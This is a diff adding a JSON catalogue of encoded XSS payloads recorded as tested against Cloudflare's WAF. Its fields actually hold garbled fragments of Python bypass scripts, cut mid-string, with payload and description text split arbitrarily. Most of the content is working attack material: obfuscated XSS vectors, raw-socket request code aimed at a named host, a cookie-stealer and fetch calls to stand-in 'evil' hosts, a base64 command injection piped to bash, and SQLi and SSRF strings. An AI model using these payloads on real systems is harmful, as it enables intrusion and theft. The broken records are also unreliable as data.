@@ -1,0 +1,175 @@
+{
+  "category": "xss",
+  "subcategory": "encoded",
+  "count": 12,
+  "payloads": [
+    {
+      "id": "xss-0012",
+      "category": "xss",
+      "subcategory": "encoded",
+      "payload": "\n--- C: PortSwigger Obfuscation ---\")\n\nOBFUSC_PAYLOADS = [\n    # Data protocol in script src\n    '<script src=data:text/javascript;base64,YWxlcnQoMSk=></script>',\n    # Data protocol with HTML entity encoded base64\n    '<script src=data:text/javascript;base64,&#x59;&#x57;&#x78;&#x6c;&#x63;&#x6e;&#x51;&#x6f;&#x4d;&#x53;&#x6b;&#x3d;></script>',\n    # Data protocol with URL encoded base64\n    '<script src=data:text/javascript;base64,%59%57%78%6c%63%6e%51%6f%4d%53%6b%3d></script>',\n    # iframe srcdoc HTML encoded\n    '<iframe srcdoc=&lt;script&gt;alert&lpar;1&rpar;&lt;&sol;script&gt;></iframe>',\n    # iframe srcdoc with different entity styles\n    '<iframe srcdoc=\"&lt;script&gt;alert(1)&lt;/script&gt;\"></iframe>",
+      "description": "<iframe srcdoc=\"&#60;script&#62;alert(1)&#60;/script&#62;\"></iframe>',\n    '<iframe srcdoc=\"&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;\"></iframe>',\n    # iframe JS URL with HTML+URL encoding\n    '<iframe src=\"javascript:\\'&#x25;&#x33;&#x43;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;&#x25;&#x33;&#x43;&#x25;&#x32;&#x46;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x25;&#x33;&#x45;\\'\"></iframe>',\n    # SVG script with unicode escapes encoded as HTML entities\n    '<svg><script>&#x5c;&#x75;&#x30;&#x30;&#x36;&#x31;&#x5c;&#x75;&#x30;&#x30;&#x36;&#x63;&#x5c;&#x75;&#x30;&#x30;&#x36;&#x35;&#x5c;&#x75;&#x30;&#x30;&#x37;&#x32;&#x5c;&#x75;&#x30;&#x30;&#x37;&#x34;(1)</script></svg>',\n    # SVG script with plain unicode\n    '<svg><script>\\\\u0061\\\\u006c\\\\u0065\\\\u0072\\\\u0074(1)</script></svg>',\n    # Script with hex escape in HTML entities\n    '<script>&#x5c;x61&#x5c;x6c&#x5c;x65&#x5c;x72&#x5c;x74(1)</script>',\n    # Object tag with data URI\n    '<object data=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\">',\n    '<object data=\"data:text/html,<script>alert(1)</script>\">',\n    # Embed with data URI\n    '<embed src=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\">',\n    # a href with data URI\n    '<a href=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\">click</a>',\n    # script src with different MIME variants\n    '<script src=\"data:;base64,YWxlcnQoMSk=\"></script>',\n    '<script src=\"data:application/javascript;base64,YWxlcnQoMSk=\"></script>',\n    '<script src=\"data:text/ecmascript;base64,YWxlcnQoMSk=\"></script>',\n    # img tag with base64 (non-exec but test WAF)\n    '<img src=\"data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+\">',\n    '<img src=\"data:image/svg+xml,<svg onload=alert(1)>\">',\n]\n\nfor p in OBFUSC_PAYLOADS:\n    get(p, label=\"obfusc",
+      "technique": "encoding",
+      "source_file": "waf_round96_portswigger.py",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "xss-0045",
+      "category": "xss",
+      "subcategory": "encoded",
+      "payload": "=\" * 70 + \"\n\")\n\n# Combine the math tag (which passes) with known bypass patterns\nmath_known = {\n    # Math + oni=on pattern (known CF bypass)\n    \"math-oni-onload\": '<math oni=on onload=alert(1)>",
+      "description": "math-oni-onfocus\": '<math oni=on onfocus=alert(1) tabindex=1>',\n    \"math-oni-onclick\": '<math oni=on onclick=alert(1)>x</math>',\n\n    # Math + Only=1 pattern\n    \"math-Only-onload\": '<math Only=1 onload=alert(1)>',\n    \"math-Only-onfocus\": '<math Only=1 onfocus=alert(1) tabindex=1>x</math>',\n    \"math-Only-onmouseover\": '<math Only=1 onmouseover=alert(1)>x</math>',\n\n    # Math children + oni=on\n    \"mtext-oni-onclick\": '<math><mtext oni=on onclick=alert(1)>x</mtext></math>',\n    \"mi-oni-onfocus\": '<math><mi oni=on onfocus=alert(1) tabindex=1>x</mi></math>',\n    \"mrow-Only-onclick\": '<math><mrow Only=1 onclick=alert(1)>x</mrow></math>',\n\n    # Math with on=on space trick\n    \"math-on-space-onload\": '<math on onload=alert(1)>',\n    \"math-on-space-onclick\": '<math on onclick=alert(1)>x</math>',\n\n    # Encoded events inside math\n    \"math-encoded-onclick\": '<math on&#x63;lick=alert(1)>x</math>',\n    \"math-encoded-onload\": '<math on&#x6c;oad=alert(1)>',\n\n    # Math with style containing expression\n    \"math-style-expr\": '<math style=\"x:expression(alert(1))\">',\n    \"math-style-url\": '<math style=\"background:url(javascript:alert(1))\">',\n\n    # Math xlink:href for navigation\n    \"math-xlink-js\": '<math xlink:href=\"javascript:alert(1)\">x</math>',\n    \"math-a-href\": '<math><mtext><a xlink:href=\"javascript:alert(1)\">x</a></mtext></math>',\n\n    # Math with definitionURL\n    \"math-defurl\": '<math definitionURL=\"javascript:alert(1)\">x</math>',\n\n    # Math actiontype\n    \"math-action\": '<math><maction actiontype=\"statusline\" xlink:href=\"javascript:alert(1)\">x<mtext>y</mtext></maction></math>',\n\n    # Math with src-like attributes\n    \"math-mglyph-src\": '<math><mglyph src=\"javascript:alert(1)\"></math>',\n}\n\nfor name, payload in math_known.items():\n    test(name, \"globalHtml\", payload)\n\n# ══════════════════════════════════════════════════════════════════════\nprint(\"\\n\" + \"=\" * 70)\nprint(\"7E: MathML POST Body (WAF might inspect POST differently)",
+      "technique": "encoding",
+      "source_file": "waf_round7_math.py",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "xss-0125",
+      "category": "xss",
+      "subcategory": "encoded",
+      "payload": "\n=== 4. Encoding Edge Cases ===\n\")\n\n# UTF-7 (old IE attack)\ntest_get(\"utf7-xss\", {\"globalHtml\": \"+ADw-script+AD4-alert(1)+ADw-/script+AD4-\"})\n\n# UTF-16 BOM trick\ntest_get(\"utf16-bom\", {\"globalHtml\": \"\\xfe\\xff<script>alert(1)</script>\"})\n\n# Overlong UTF-8 (2-byte encoding of <)\ntest_get(\"overlong-utf8-2byte\", {\"globalHtml\": \"\\xc0\\xbc\\xc0\\xb3\\xc0\\xa3\\xc0\\xb2\\xc0\\xa9\\xc0\\xb0\\xc0\\xb4\\xc0\\xbe\"})\n\n# HTML numeric entity without semicolon\ntest_get(\"entity-no-semi\", {\"globalHtml\": \"<img src=x onerror=&#97lert(1)>\"})\n\n# Hex entity without semicolon  \ntest_get(\"hex-entity-no-semi\", {\"globalHtml\": \"<img src=x onerror=&#x61lert(1)>\"})\n\n# Tab/null between on and event name\ntest_get(\"tab-in-event\", {\"globalHtml\": \"<img src=x on\terror=alert(1)>\"})\ntest_get(\"null-in-event\", {\"globalHtml\": \"<img src=x on\\x00error=alert(1)>\"})\ntest_get(\"vtab-in-event\", {\"globalHtml\": \"<img src=x on\\x0berror=alert(1)>\"})\ntest_get(\"ff-in-event\", {\"globalHtml\": \"<img src=x on\\x0cerror=alert(1)>\"})\n\n# ── 5. Request header injection vectors ──────────────────────────────────\nprint(\"\n=== 5. Header-Based Vectors ===\n\")\n\n# Referer-based XSS (if reflected)\ntry:\n    r = requests.get(BASE, verify=False, timeout=TIMEOUT,\n                     headers={\"Referer\": \"<script>alert(1)</script>\"})\n    print(f\"  {'referer-xss':40s} HTTP {r.status_code}\")\nexcept Exception as e:\n    print(f\"  {'referer-xss':40s} ERROR\")\n\n# User-Agent based\ntry:\n    r = requests.get(BASE, verify=False, timeout=TIMEOUT,\n                     headers={\"User-Agent\": \"<script>alert(1)</script>\"})\n    print(f\"  {'useragent-xss':40s} HTTP {r.status_code}\")\nexcept Exception as e:\n    print(f\"  {'useragent-xss':40s} ERROR\")\n\n# X-Forwarded-For\ntry:\n    r = requests.get(BASE, verify=False, timeout=TIMEOUT,\n                     headers={\"X-Forwarded-For\": \"<script>alert(1)</script>\"})\n    print(f\"  {'xff-xss':40s} HTTP {r.status_code}\")\nexcept Exception as e:\n    print(f\"  {'xff-xss':40s} ERROR\")\n\n# ── 6. Path-based injection ──────────────────────────────────────────────\nprint(\"\n=== 6. Path-Based Injection ===\n\")\n\ntest_raw(\"path-xss\", BASE + \"<img src=x onerror=alert(1)>\")\ntest_raw(\"path-encoded\", BASE + \"%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E\")\ntest_raw(\"path-double-encoded\", BASE + \"%253Cimg%2520src%253Dx%2520onerror%253Dalert(1)%253E\")\n\n# ── 7. Fragment / hash (server shouldn't see, but test anyway) ───────────\nprint(\"\n=== 7. Attribute Context Advanced ===\n\")\n\nattr_payloads = {\n    # Event with unusual whitespace\n    \"attr-formfeed\": '\" \\x0confocus=alert(1) autofocus x=\"",
+      "description": "attr-vtab\": '\" \\x0bonfocus=alert(1) autofocus x=\"',\n    # Grave accent\n    \"attr-grave\": '`onfocus=alert(1) autofocus `',\n    # Entity-encoded breakout\n    \"attr-entity-break\": '&#34; onfocus=alert(1) autofocus x=&#34;',\n    # JavaScript URI in href attribute (if reflected in <a>)\n    \"attr-js-uri\": 'javascript:alert(1)',\n    # CSS expression in style\n    \"attr-css-expr\": 'x; background: url(javascript:alert(1));',\n    # SVG in attribute\n    \"attr-svg-data\": 'data:image/svg+xml,<svg onload=alert(1)>',\n    # Double encoding\n    \"attr-double-enc\": '%22%20onfocus%3Dalert(1)%20autofocus%20x%3D%22',\n    # Unicode quote\n    \"attr-unicode-quote\": '\\u0022 onfocus=alert(1) autofocus x=\\u0022',\n    # Encoded angle brackets inside attr\n    \"attr-angle-enc\": '\"><img src=x onerror=alert(1)>',\n}\n\nfor name, payload in attr_payloads.items():\n    r = test_get(name, {\"attributeHtml\": payload})\n    if r:\n        partials.append(name)\n\n# ── 8. Content-Length / Transfer-Encoding tricks ─────────────────────────\nprint(\"\\n=== 8. Smuggling-Style Tricks ===\\n",
+      "technique": "encoding",
+      "source_file": "waf_round3.py",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "xss-0157",
+      "category": "xss",
+      "subcategory": "encoded",
+      "payload": "alert(1)\")()}}</div>',\n    # Server-Side Template Injection patterns\n    '{{7*7}}${7*7}<%= 7*7 %>${{7*7}}#{7*7}',\n]\n\nfor p in POLYGLOT_PAYLOADS:\n    get(p, label=\"polyglot\")\n    post(p, label=\"polyglot-post\")\n\nprint(f\"  Polyglot done: {total} total\")\n\n# ═══════════════════════════════════════════════════════════════\nprint(\"\n--- E: attributeHtml with All Research Techniques ---\")\n\nATTR_RESEARCH = [\n    # \"on\" prefix technique\n    '\" on= onfocus=alert(1) autofocus x=\"",
+      "description": "\" on onfocus=alert(1) autofocus x=\"',\n    '\" onx=() onfocus=alert(1) autofocus x=\"',\n    '\" oNLy=1 onfocus=alert(1) autofocus x=\"',\n    # Mixed case\n    '\" OnFoCuS=alert(1) autofocus x=\"',\n    '\" ONFOCUS=ALERT(1) autofocus x=\"',\n    # Alt functions\n    '\" onfocus=confirm(1) autofocus x=\"',\n    '\" onfocus=prompt(1) autofocus x=\"',\n    '\" onfocus=print() autofocus x=\"',\n    '\" onfocus=window.alert?.() autofocus x=\"',\n    '\" onfocus=(alert)(1) autofocus x=\"',\n    '\" onfocus=[1].find(alert) autofocus x=\"',\n    '\" onfocus=.1|alert`` autofocus x=\"',\n    # Unicode\n    '\" onfocus=\\\\u0061\\\\u006c\\\\u0065\\\\u0072\\\\u0074(1) autofocus x=\"',\n    # Entity\n    '\" onfocus=alert&#40;1&#41; autofocus x=\"',\n    '\" onfocus=alert%26%230000000040;1%26%230000000041; autofocus x=\"',\n    # Eval chains\n    '\" onfocus=eval(atob(\"YWxlcnQoMSk=",
+      "technique": "encoding",
+      "source_file": "waf_round94_final.py",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "xss-0172",
+      "category": "xss",
+      "subcategory": "encoded",
+      "payload": "\n\" + \"=\" * 70)\nprint(\"14A: Confirm Self-Close Breakout with Popover+ID\")\nprint(\"=\" * 70 + \"\n\")\n\n# Confirm what we found in Round 13\nconfirms = {\n    \"confirm-math-pop-id\": {\"attributeHtml\": '\"/><math popover id=xp'},\n    \"confirm-math-pop-id-close\": {\"attributeHtml\": '\"/><math popover id=xp>content</math'},\n    \"confirm-details-pop-open\": {\"attributeHtml\": '\"/><details popover open'},\n    \"confirm-details-pop-id\": {\"attributeHtml\": '\"/><details popover id=xp'},\n    \"confirm-details-pop-id-open\": {\"attributeHtml\": '\"/><details popover id=xp open'},\n    \"confirm-wide-pop-id\": {\"attributeHtml\": '\" popover                    id=xpop x=\"'},\n}\n\nfor name, params in confirms.items():\n    test(name, params)\n\n# ══════════════════════════════════════════════════════════════════════\nprint(\"\n\" + \"=\" * 70)\nprint(\"14B: Add ontoggle to Self-Close Math/Details\")\nprint(\"=\" * 70 + \"\n\")\n\n# The critical step — can we add ontoggle to the popover element?\nontoggle_inject = {\n    # Direct ontoggle on math popover\n    \"sc-math-pop-id-ontoggle\": {\"attributeHtml\": '\"/><math popover id=xp ontoggle=alert(1)'},\n    # ontoggle before popover\n    \"sc-math-ontoggle-pop-id\": {\"attributeHtml\": '\"/><math ontoggle=alert(1) popover id=xp'},\n    # With wide spacing\n    \"sc-math-pop-space-id-space-ontoggle\": {\"attributeHtml\": '\"/><math popover                    id=xp                    ontoggle=alert(1)'},\n    # With confirm instead of alert\n    \"sc-math-pop-id-ontoggle-confirm\": {\"attributeHtml\": '\"/><math popover id=xp ontoggle=confirm(1)'},\n    # With print\n    \"sc-math-pop-id-ontoggle-print\": {\"attributeHtml\": '\"/><math popover id=xp ontoggle=print()'},\n    # Without function call\n    \"sc-math-pop-id-ontoggle-1\": {\"attributeHtml\": '\"/><math popover id=xp ontoggle=1'},\n    \"sc-math-pop-id-ontoggle-x\": {\"attributeHtml\": '\"/><math popover id=xp ontoggle=x'},\n    \"sc-math-pop-id-ontoggle-void\": {\"attributeHtml\": '\"/><math popover id=xp ontoggle=void(0)'},\n    \"sc-math-pop-id-ontoggle-empty\": {\"attributeHtml\": '\"/><math popover id=xp ontoggle=\"\"'},\n\n    # Same for details\n    \"sc-details-pop-id-ontoggle\": {\"attributeHtml\": '\"/><details popover id=xp ontoggle=alert(1)'},\n    \"sc-details-pop-id-ontoggle-1\": {\"attributeHtml\": '\"/><details popover id=xp ontoggle=1'},\n\n    # onbeforetoggle instead\n    \"sc-math-pop-id-onbeforetoggle\": {\"attributeHtml\": '\"/><math popover id=xp onbeforetoggle=alert(1)'},\n    \"sc-math-pop-id-onbeforetoggle-1\": {\"attributeHtml\": '\"/><math popover id=xp onbeforetoggle=1'},\n\n    # Mixed case\n    \"sc-math-pop-id-ONTOGGLE\": {\"attributeHtml\": '\"/><math popover id=xp ONTOGGLE=alert(1)'},\n    \"sc-math-pop-id-OnToggle\": {\"attributeHtml\": '\"/><math popover id=xp OnToggle=alert(1)'},\n}\n\nfor name, params in ontoggle_inject.items():\n    test(name, params)\n\n# ══════════════════════════════════════════════════════════════════════\nprint(\"\n\" + \"=\" * 70)\nprint(\"14C: Split ontoggle Across Both Params\")\nprint(\"=\" * 70 + \"\n\")\n\n# globalHtml has the ontoggle as text (passes)\n# attributeHtml has the popover element (passes)\n# Can the browser combine them?\n\nsplit_ontoggle = {\n    # Attr: create element, Global: ontoggle text (won't work as attr but test)\n    \"split-attr-math-global-ontoggle\": {\n        \"attributeHtml\": '\"/><math popover id=xp",
+      "description": "globalHtml\": \"ontoggle=alert(1)\",\n    },\n    # Global: create element with math+popover, Attr: add ontoggle\n    \"split-global-math-attr-ontoggle\": {\n        \"globalHtml\": \"<math popover id=xp>content</math>\",\n        \"attributeHtml\": '\" ontoggle=alert(1) x=\"',\n    },\n    # Attr: math popover id, Global: button popovertarget  \n    \"split-attr-pop-global-btn\": {\n        \"attributeHtml\": '\"/><math popover id=xp>popup',\n        \"globalHtml\": '<button popovertarget=xp>show</button>',\n    },\n}\n\nfor name, params in split_ontoggle.items():\n    test(name, params)\n\n# ══════════════════════════════════════════════════════════════════════\nprint(\"\\n\" + \"=\" * 70)\nprint(\"14D: Encode ontoggle to Bypass WAF Pattern",
+      "technique": "encoding",
+      "source_file": "waf_round14_exploit.py",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "xss-0176",
+      "category": "xss",
+      "subcategory": "encoded",
+      "payload": "test\") x=\"'},\n    \"hexaphp-attr-src\": {\"attributeHtml\": '\" src=OnErRor OnErRor=(alert)(\"test\") x=\"'},\n    # Self-close breakout\n    \"hexaphp-sc\": {\"attributeHtml\": '\"/><img src=OnErRor OnErRor=(alert)(\"test\")'},\n    # Via POST\n    \"hexaphp-post\": '<img src=OnErRor OnErRor=(alert)(\"test\")>',\n}\n\nfor name, payload in hexaphp.items():\n    if isinstance(payload, dict):\n        test(name, payload)\n    elif name == \"hexaphp-post\":\n        test(name, {\"globalHtml\": payload}, method=\"POST\")\n    else:\n        test(name, {\"globalHtml\": payload})\n\n# ══════════════════════════════════════════════════════════════\nprint(\"\n\" + \"=\" * 75)\nprint(\"19C: botesjuan — Cloudflare-Specific Bypasses\")\nprint(\"=\" * 75 + \"\n\")\n\nbotesjuan = {\n    # oncut event (claimed CF bypass)\n    \"bj-img-oncut\": '<img src=\"x\" oncut=\"fetch(\\'http://evil.com/\\')\">",
+      "description": "bj-div-oncut\": '<div oncut=alert(1)>test</div>',\n    \"bj-input-oncut\": '<input oncut=alert(1) value=test>',\n    # oncopy/onpaste (similar events)\n    \"bj-div-oncopy\": '<div oncopy=alert(1)>test</div>',\n    \"bj-div-onpaste\": '<div onpaste=alert(1)>test</div>',\n    # NFKD Unicode normalization bypass\n    \"bj-nfkd-img\": '\\uff1cimg src\\u207dp onerror\\u207d\\uff07prompt\\u207d1\\u207e\\uff07\\ufe65',\n    # Gecko engine special chars between event and =\n    \"bj-body-special\": '<BODY onload!#$%&()*~+-_.,:;?@[/|\\\\]^`=confirm()>',\n    # Hex-encoded cookie stealer\n    \"bj-script-hex\": '<script>var x=String.fromCharCode(100,111,99,117,109,101,110,116);fetch(\"http://evil/\"+x)</script>',\n    # JSON whitespace SQL bypass (test in XSS context too)\n    \"bj-sqli-json\": \"'/**/OR/**/'1'/**/=/**/'1'\",\n    # SSRF hex IP\n    \"bj-ssrf-hex\": \"http://0x7F000001:8080/\",\n    # base64 command injection\n    \"bj-cmdi-b64\": \"$(echo cGluZyAtYyA0IGF0dGFja2VyLmNvbQo= | base64 -d | bash)\",\n}\n\nfor name, payload in botesjuan.items():\n    test(name, {\"globalHtml\": payload})\n\n# ══════════════════════════════════════════════════════════════\nprint(\"\\n\" + \"=\" * 75)\nprint(\"19D: kh4sh3i/WAF-Bypass — Techniques",
+      "technique": "encoding",
+      "source_file": "waf_round19_github.py",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "xss-0186",
+      "category": "xss",
+      "subcategory": "encoded",
+      "payload": "ale'+'rt'](1)\",\n    lambda o: f\"{o}[/*x*/'alert'/*y*/](1)\",\n    lambda o: f\"{o}['\\\\x61\\\\x6c\\\\x65\\\\x72\\\\x74'](1)\",\n    lambda o: f\"{o}['\\\\u0061\\\\u006c\\\\u0065\\\\u0072\\\\u0074'](1)\",\n]\n\ncount_f = 0\nfor obj in GLOBAL_OBJS:\n    for fmt in GLOBAL_FMTS:\n        func = fmt(obj)\n        for tag, event, extra, suffix in TAGS_EVENTS:\n            for prefix in ON_PREFIXES:\n                p = f'<{tag} {prefix}{event}={func}{extra}{suffix}'\n                get(p, label=f\"comp-{obj[:3]}-{tag}\")\n                count_f += 1\n                if count_f >= 500:\n                    break\n            if count_f >= 500: break\n        if count_f >= 500: break\n    if count_f >= 500: break\n\nprint(f\"  Comprehensive done: {count_f}, {total} total\")\n\n# ═══════════════════════════════════════════════════════════════\nprint(\"\n--- G: Second-Order / Stored Patterns ---\")\n\nSECOND_ORDER = [\n    # Store payload in one param, trigger in another\n    # JSON with XSS in value\n    '{\"name\":\"<img src=x onerror=alert(1)>",
+      "description": "email\":\"test@test.com\"}',\n    '{\"search\":\"<script>alert(1)</script>\"}',\n    '{\"q\":\"<svg onload=alert(1)>\"}',\n    # XML with XSS\n    '<?xml version=\"1.0\"?><data><name>&lt;script&gt;alert(1)&lt;/script&gt;</name></data>',\n    '<xml><name><![CDATA[<script>alert(1)</script>]]></name></xml>',\n    # URL encoded in JSON\n    '{\"url\":\"javascript:alert(1)\"}',\n    '{\"redirect\":\"data:text/html,<script>alert(1)</script>\"}',\n    # Markdown XSS\n    '[clickme](javascript:alert(1))',\n    '![img](x\" onerror=\"alert(1))',\n    # CSV injection\n    '=cmd|\"/C calc\"|\"!A1\"',\n    '+cmd|\"/C calc\"|\"!A1\"',\n    # LDAP injection\n    '*)(uid=*))(|(uid=*',\n]\n\nfor p in SECOND_ORDER:\n    get(p, label=\"second-order",
+      "technique": "encoding",
+      "source_file": "waf_round97_portswigger2.py",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "xss-0316",
+      "category": "xss",
+      "subcategory": "encoded",
+      "payload": "{b}'))()\",\n    lambda b: f\"[]['filter']['constructor'](atob('{b}'))()\",\n    lambda b: f\"setTimeout(atob('{b}'))\",\n    lambda b: f\"self[atob('YWxlcnQ=')](1)\",  # atob('alert')\n    lambda b: f\"window[atob('YWxlcnQ=')](1)\",\n    lambda b: f\"top[atob('YWxlcnQ=')](1)\",\n    lambda b: f\"globalThis[atob('YWxlcnQ=')](1)\",\n]\n\ncount_a = 0\nfor js in JS_PAYLOADS[:10]:\n    b64 = base64.b64encode(js.encode()).decode()\n    for wrapper in HTML_WRAPPERS[:4]:\n        for b64_eval in b64_evals[:4]:\n            payload = wrapper.replace('BASE64_EVAL', b64_eval(b64))\n            get(payload)\n            count_a += 1\n\n# Base64 of full HTML payloads as data URIs\nFULL_HTML = [\n    '<script>alert(1)</script>",
+      "description": "<img src=x onerror=alert(1)>',\n    '<svg onload=alert(1)>',\n    '<body onload=alert(1)>',\n    '<input onfocus=alert(1) autofocus>',\n]\nfor html in FULL_HTML:\n    b64 = base64.b64encode(html.encode()).decode()\n    # iframe src data URI\n    test(f'<iframe src=\"data:text/html;base64,{b64}\">",
+      "technique": "encoding",
+      "source_file": "waf_round76_cross2.py",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "xss-0452",
+      "category": "xss",
+      "subcategory": "encoded",
+      "payload": "\n--- B: JS Obfuscation Techniques (100+) ---\")\n\nOBFUSC = [\n    # String.fromCharCode\n    '<img src=x onerror=String.fromCharCode(97,108,101,114,116)(1)>",
+      "description": "<svg/onload=Function(String.fromCharCode(97,108,101,114,116,40,49,41))()>',\n    # Octal in script\n    '<script>\\\\141\\\\154\\\\145\\\\162\\\\164(1)</script>',\n    # Hex in script\n    '<script>\\\\x61\\\\x6c\\\\x65\\\\x72\\\\x74(1)</script>',\n    # Unicode in script\n    '<script>\\\\u0061\\\\u006c\\\\u0065\\\\u0072\\\\u0074(1)</script>',\n    # eval + String.fromCharCode\n    '<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>',\n    # setTimeout\n    '<img src=x onerror=setTimeout(String.fromCharCode(97,108,101,114,116,40,49,41))>',\n    # setInterval\n    '<img src=x onerror=setInterval(String.fromCharCode(97,108,101,114,116,40,49,41),9999)>',\n    # Function constructor\n    '<img src=x onerror=Function(String.fromCharCode(97,108,101,114,116,40,49,41))()>',\n    # With statement\n    '<img src=x onerror=\"with(document)write(1)\">',\n    # Comma operator\n    '<img src=x onerror=\"1,alert(1)\">',\n    '<img src=x onerror=\"void(alert(1))\">',\n    '<img src=x onerror=\"!alert(1)\">',\n    '<img src=x onerror=\"+alert(1)\">',\n    '<img src=x onerror=\"-alert(1)\">',\n    '<img src=x onerror=\"~alert(1)\">',\n    # Arrow function\n    '<img src=x onerror=\"(()=>alert(1))()\">',\n    # Async\n    '<img src=x onerror=\"(async()=>alert(1))()\">',\n    # Generator\n    '<img src=x onerror=\"(function*(){yield alert(1)})().next()\">',\n    # Proxy\n    '<img src=x onerror=\"new Proxy({},{get:()=>alert(1)}).x\">',\n    # Symbol.toPrimitive\n    '<img src=x onerror=\"({[Symbol.toPrimitive]:alert}+1)\">',\n    # Tagged template\n    '<img src=x onerror=\"alert`1`\">',\n    '<svg/onload=\"confirm`1`\">',\n    '<svg/onload=\"prompt`1`\">',\n    # Reflect\n    '<img src=x onerror=\"Reflect.apply(alert,null,[1])\">',\n    '<img src=x onerror=\"Reflect.construct(Function,[\\'alert(1)\\",
+      "technique": "encoding",
+      "source_file": "waf_round79_cross3.py",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "xss-0503",
+      "category": "xss",
+      "subcategory": "encoded",
+      "payload": "utf-8', errors='surrogateescape')\n        ssock.sendall(req)\n        response = b\"\"\n        while True:\n            try:\n                ssock.settimeout(10)\n                d = ssock.recv(8192)\n                if not d: break\n                response += d\n            except: break\n        ssock.close()\n        resp_str = response.decode(\"utf-8\", errors=\"replace\")\n        status_m = re.search(r'HTTP/[\\d.]+ (\\d+)', resp_str)\n        status = int(status_m.group(1)) if status_m else 0\n        blocked = status in (403, 406, 503)\n        \n        # Check for REAL onfocus/onload reflected (not on{focus)\n        has_real_event = bool(re.search(r'\\bon(focus|load|error|click|mouseover)\\s*=', resp_str))\n        has_gap_event = bool(re.search(r'\\bon[^a-zA-Z0-9\\s\"\\'<>](focus|load|error|click)', resp_str))\n        has_alert = 'alert(' in resp_str.lower()\n        \n        mark = \"\"\n        if has_real_event and not blocked:\n            mark = \" *** REAL EVENT REFLECTED ***\"\n            found.append(name)\n            idx = resp_str.find('value=\"')\n            if idx > 0:\n                print(f\"    INPUT: {resp_str[idx:idx+200]}\")\n        elif has_gap_event and not blocked:\n            mark = \" gap-reflected\"\n        elif not blocked and status == 200:\n            mark = \"\"\n        \n        result = \"BLOCK\" if blocked else str(status)\n        print(f\"  {name:55s} HTTP {result}{mark}\")\n        return status, blocked, has_real_event\n    except Exception as e:\n        print(f\"  {name:55s} ERR: {str(e)[:60]}\")\n        return 0, True, False\n\n\ndef raw_post(name, body_bytes, ct=\"application/x-www-form-urlencoded\"):\n    \"\"\"Send raw POST request with exact bytes.\"\"\"\n    try:\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n        sock = socket.create_connection((HOST, PORT), timeout=TIMEOUT)\n        ssock = ctx.wrap_socket(sock, server_hostname=HOST)\n        req = (\n            b\"POST / HTTP/1.1\r\n\"\n            b\"Host: waf.cumulusfire.net\r\n\"\n            b\"Content-Type: \" + ct.encode() + b\"\r\n\"\n            b\"Content-Length: \" + str(len(body_bytes)).encode() + b\"\r\n\"\n            b\"Connection: close\r\n\r\n\"\n            + body_bytes\n        )\n        ssock.sendall(req)\n        response = b\"\"\n        while True:\n            try:\n                ssock.settimeout(10)\n                d = ssock.recv(8192)\n                if not d: break\n                response += d\n            except: break\n        ssock.close()\n        resp_str = response.decode(\"utf-8\", errors=\"replace\")\n        status_m = re.search(r'HTTP/[\\d.]+ (\\d+)', resp_str)\n        status = int(status_m.group(1)) if status_m else 0\n        blocked = status in (403, 406, 503)\n        \n        has_real_event = bool(re.search(r'\\bon(focus|load|error|click|mouseover)\\s*=', resp_str))\n        has_gap_event = bool(re.search(r'\\bon[^a-zA-Z0-9\\s\"\\'<>](focus|load|error|click)', resp_str))\n        \n        mark = \"\"\n        if has_real_event and not blocked:\n            mark = \" *** REAL EVENT REFLECTED ***\"\n            found.append(name)\n            idx = resp_str.find('value=\"')\n            if idx > 0:\n                print(f\"    INPUT: {resp_str[idx:idx+200]}\")\n        elif has_gap_event and not blocked:\n            mark = \" gap-reflected\"\n        \n        result = \"BLOCK\" if blocked else str(status)\n        print(f\"  {name:55s} HTTP {result}{mark}\")\n        return status, blocked, has_real_event\n    except Exception as e:\n        print(f\"  {name:55s} ERR: {str(e)[:60]}\")\n        return 0, True, False\n\n\n# ══════════════════════════════════════════════════════════════════\nprint(\"\n\" + \"=\" * 80)\nprint(\"57A: HTML Entity Encoding of Event Handlers\")\nprint(\"=\" * 80 + \"\n\")\n\n# HTML entities are decoded by the browser in attribute values.\n# If WAF doesn't decode entities but browser does:\n# &#111;nfocus → browser sees \"onfocus\" \n# &#x6f;nfocus → browser sees \"onfocus\"\n\n# BUT: entities in attribute NAMES are NOT decoded by browsers.\n# They only work in attribute VALUES and text content.\n# So this won't work for attribute names...\n\n# HOWEVER: what about entities INSIDE the attribute value context?\n# The page has: <input value=\"INJECTION\">\n# If we inject: \" onfocus=&#97;lert(1) \"\n# The onfocus= is the attribute name (no entities)\n# The value &#97;lert(1) IS decoded → alert(1)\n\n# First: test if WAF blocks onfocus=&#97;lert(1) (entity-encoded alert)\nentity_payloads = {\n    # Entity-encoded JS function names\n    